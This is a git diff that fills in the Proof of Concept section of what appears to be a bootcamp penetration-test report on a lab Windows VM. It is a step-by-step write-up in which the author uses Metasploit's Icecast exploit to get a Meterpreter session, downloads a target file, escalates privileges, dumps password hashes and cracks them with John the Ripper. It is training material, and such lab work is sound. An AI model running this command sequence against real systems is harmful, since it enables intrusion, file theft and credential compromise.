@@ -70,8 +70,84 @@ classified as a Critical Severity Level.
 
 Proof of Concept:
 
-This is where you show the steps you took. Show the client how you
-exploited the software services. Please include screenshots!
+Normally during a penetration I would have to break into the network and scan the network in order to find the computer that I would then need to attack. However that was not the scope of this test, and I was given access to the network as well as the working IP address of the victims computer (192.168.0.6)
+
+Now that I have both network connection and the IP address, I run the NMAP tool with the option os -sV, which allows us to see the service or version of what's running on that port. The command looked like `nmap -sV`
+
+
+As we see it's the normal services running on the ports except port 8000, which has Icecast running on it. Once I found out this information I quick Googled, Icecast to find out what it is, and found that it's an open source or free in other terms, streaming server for audio/video. 
+With that knowledge I searched for an exploit using the searchsploit command. This is easily done by typing `searchsploit Icecast`, and as you see a couple exploits were found. 
+
+
+Now that I found it to be vulnerable, I opened the Metasploit program. This is another database of exploits, that we can uses to attack a vulnerability. The command to run this program is `msfconsole`.
+
+
+Once Metasploit opened I again searched to see if Icecast had an exploit in here. I did this by running `search Icecast` which returned the following result.
+
+To use this module I typed in `use 0`. This will load the module so I can see the information on it and start manipulating the data in order to point it at the correct machine. 
+
+
+Before I could use this exploit I would need to know what information I would need to input in order for it to work. I use the `info` command to view the information about the module, and what variable I had to set. 
+
+
+I then proceeded to set the Remote hosts IP address to the victims computer by typing `set RHOST 192.168.0.6`
+
+I then had to set the local hosts or my computers IP address in the module as well. This is specific to my testing computer. To do this I ran the command `set LHOST 192.168.0.2`
+
+I then typed `run` which delivered the payload and opened up a Meterpreter command line. Meterpreter runs in the memory of the victims computer and does not install anything to the hard drive. 
+
+Once I had the command line I typed `getuid`. This command gives me the user ID of who I'm logged in as. in this case it's the IEUser on the MSEDGEWIN10 network. 
+
+I also ran the `pwd` command which tells me what directory I'm currently in. This information is needed in order to accurately move around the system. 
+
+I then set out to find the secret recipe file and exfiltrate it. 
+
+The first command I ran was `search -f *secret*txt -r` this searched the victims computer for a text file that contained the work secret. It returned one file located at `c:\Users\IEUser\Documents\user.secretfile.txt`. This file was not the file I was tasked with exfiltrating, so I left it alone. 
+
+I then modified my search to `search -f *recipe*.txt` this returned the file that I was tasked to exfiltrate, located at `c:\Users\IEUser\Documents\Drinks.recipe.txt`
+
+Now with the location I began to exfiltrate (download) the file, using the following command `download "c:\Users\IEUser\Documents\Drinks.recipe.txt"`
+
+I then opened another terminal and ran `cat Drinks.recipe.txt` to view the contents of the file. 
+
+Then just to prove that I had accessed the computer, and viewed the secret recipe file. I uploaded a file to the same location `c:\Users\IEUser\Documents\` called Doctor.txt which contains the next line of the song. 
+
+![upload](https://github.com/shansen18/BootCamp/blob/main/Week17/images/upload.JPG)
+![upload2](https://github.com/shansen18/BootCamp/blob/main/Week17/images/uploadedtextfile.JPG)
+![upload3](https://github.com/shansen18/BootCamp/blob/main/Week17/images/Contentsdoctor.JPG)
+
+At this point we are done with the exercise. I have exploited a vulnerability on the victims computer, and was both able to exfiltrate a file, as well as upload my own file. However I feel to further prove our standpoint that this is a critical flaw. To do this I will run a script that will show all logged on users, open a shell on the victims computer, show the victims computers information, as well as retrieve and crack his password. 
+
+
+So the first thing I did was to the command `run post/windows/gather/enum_logged_on_users` while still in the Meterpreter command line. This returned the user IEUser as the only one currently logged in but we can also see two other users recently logged in. 
+
+![userenum](https://github.com/shansen18/BootCamp/blob/d4348fcf0f79e669ebb3d1948b923f38479c7b90/Week17/images/enum_logged_on_users.JPG)
+
+
+I then ran the command `shell` to open a shell, which basically acts and uses the same commands as a windows command prompt. 
+
+![shell](https://github.com/shansen18/BootCamp/blob/main/Week17/images/shell.JPG)
+
+
+Going back to Meterpreter I ran the `sysinfo` command which gave me the information in the following screenshot. 
+
+![systeminfo](https://github.com/shansen18/BootCamp/blob/e5c97c371c3a80a0bddbdea6480b5f8218ace37c/Week17/images/getsystem.JPG)
+
+
+So now using the `getsystem` command I was able to get Root or admin privilege. 
+
+![getroot](https://github.com/shansen18/BootCamp/blob/main/Week17/images/getpriv.JPG)
+
+
+From there in Meterpreter I ran the following command to get the password hashes. 
+`run post/windows/gather/hashdump`
+
+![hash](https://github.com/shansen18/BootCamp/blob/main/Week17/images/hashdump.JPG)
+
+
+Once I received the hashes, I copied them to a file I named hashes.txt on my attacking machine. From there I ran a program called John the Ripper to crack the hashes. In order to do this I had to run the following command `john --format=NT --wordlist=rockyou.txt hashes.txt`  This returned the following information. 
+
+![john](https://github.com/shansen18/BootCamp/blob/e5c97c371c3a80a0bddbdea6480b5f8218ace37c/Week17/images/john_results.JPG)
 
 There should be a separate finding for each vulnerability found!
 
